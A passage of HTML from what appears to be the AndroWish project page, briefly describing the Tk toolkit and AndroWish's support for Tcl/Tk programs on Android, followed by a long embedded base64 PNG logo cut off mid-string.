</p><p>Tk is a graphical user interface toolkit that takes developing desktop applications to a higher level than conventional approaches. Tk is the standard GUI not only for Tcl, but for many other dynamic languages, and can produce rich, native applications that run unchanged across Windows, Mac OS X, Linux and more. 

</p><p>AndroWish allows to run desktop Tcl and Tk programs almost unaltered on the Android Platform while it opens the door to script a rich feature set of a mobile platform. Its sibling <a href="https://www.androwish.org/index.html/wiki?name=undroidwish">undroidwish</a> uses the same code base and  offers a similar feature set on various desktop and embedded platforms.

</p></td><td>
<img width="160px" height="160px" src="data:image/png;base64,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